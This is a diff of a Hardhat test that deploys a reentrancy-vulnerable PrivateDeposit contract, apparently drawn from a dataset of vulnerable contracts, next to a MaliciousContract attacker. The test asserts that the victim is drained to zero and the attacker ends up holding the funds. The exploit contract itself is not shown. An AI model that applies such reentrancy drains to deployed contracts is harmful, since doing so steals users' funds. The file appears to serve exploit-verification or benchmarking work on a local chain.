@@ -2,9 +2,9 @@ const { expect } = require("chai");
 const { ethers } = require("hardhat");
 describe("Reentrancy Attack for 0x7a8721a9d64c74da899424c1b52acbf58ddc9782.sol", function () {
   let PrivateDeposit;
-  let privateDeposit;
+  let victim;
   let MaliciousContract;
-  let maliciousContract;
+  let hacker;
   let Log;
   let log;
 
@@ -16,44 +16,52 @@ describe("Reentrancy Attack for 0x7a8721a9d64c74da899424c1b52acbf58ddc9782.sol",
 
     // Deploy PrivateDeposit contract with Log address
     PrivateDeposit = await ethers.getContractFactory("contracts/dataset/reentrancy/0x7a8721a9d64c74da899424c1b52acbf58ddc9782.sol:PrivateDeposit");
-    privateDeposit = await PrivateDeposit.deploy();
-    await privateDeposit.waitForDeployment();
-    await privateDeposit.setLog(log.target); // Set Log address after deployment
+    victim = await PrivateDeposit.deploy();
+    await victim.waitForDeployment();
+    await victim.setLog(log.target); // Set Log address after deployment
 
-    // Deploy MaliciousContract with PrivateDeposit address
+    // Deploy hacker with victim address
     MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/0x7a8721a9d64c74da899424c1b52acbf58ddc9782_attack.sol:MaliciousContract");
-    maliciousContract = await MaliciousContract.deploy(privateDeposit.target);
+    hacker = await MaliciousContract.deploy(victim.target);
   });
 
   it("should successfully drain funds through reentrancy attack", async function () {
-    // Initial deposit to PrivateDeposit contract
-    await privateDeposit.Deposit({ value: ethers.parseEther("5") });
-
-    const victimInitialBalance = await ethers.provider.getBalance(privateDeposit.target);
-    expect(victimInitialBalance).to.equal(ethers.parseEther("5")); 
-
-
-    // Initial deposit from maliciousCOntract on Personal Bank
-    await maliciousContract.deposit({value:  ethers.parseEther("2")});
-
-    const victimBalanceAfterDeposit = await ethers.provider.getBalance(privateDeposit.target);
-    expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("7")); 
+    // Initial deposit to victim contract
+    await victim.Deposit({ value: ethers.parseEther("5") });
+    // verify correct deposit
+    const initialBalance = await ethers.provider.getBalance(victim.target);
+    expect(initialBalance).to.equal(ethers.parseEther("5")); 
 
 
-    // Perform reentrancy attack through MaliciousContract
-    await maliciousContract.attack({value:  ethers.parseEther("2")});
-    
-    // Check balances after attack
-    const victimBalance = await ethers.provider.getBalance(privateDeposit.target);
-    const maliciousContractBalance = await ethers.provider.getBalance(maliciousContract.target);
+    // Initial deposit from hacker on victim contract
+    await hacker.deposit({value:  ethers.parseEther("2")});
+
+    const privateBalanceAfterMaliciousDeposit = await ethers.provider.getBalance(victim.target);
+    expect(privateBalanceAfterMaliciousDeposit).to.equal(ethers.parseEther("7")); 
+
+    // we set the hackers balance to 0
+    await network.provider.send("hardhat_setBalance", [
+      hacker.target,
+      "0x0",
+    ]);
+    let hackerBalanceBeforeAttack = await ethers.provider.getBalance(hacker.target);
+    expect(hackerBalanceBeforeAttack).to.equal(0);
+
+
+
+    // Perform reentrancy attack through hacker
+    await hacker.attack(ethers.parseEther("2"));
 
     // Verify the attack was successful
-    
-    // privateDeposit has a drained account
-    expect(victimBalance).to.equal(ethers.parseEther("0")); 
 
-    // 5 original balance + 2 from attacker initial deposit + 2 from attacker attack
-    expect(maliciousContractBalance).to.equal(ethers.parseEther("9"));
+    // Check balances after attack
+    const personalBankBalance = await ethers.provider.getBalance(victim.target);
+    const hackerBalance = await ethers.provider.getBalance(hacker.target);
     
+    // victim has a drained account
+    expect(personalBankBalance).to.equal(ethers.parseEther("0")); 
+
+    //hacker has the balance:  5 original balance + 2 from hacker's initial deposit 
+    expect(hackerBalance).to.equal(ethers.parseEther("7"));
   });
 });
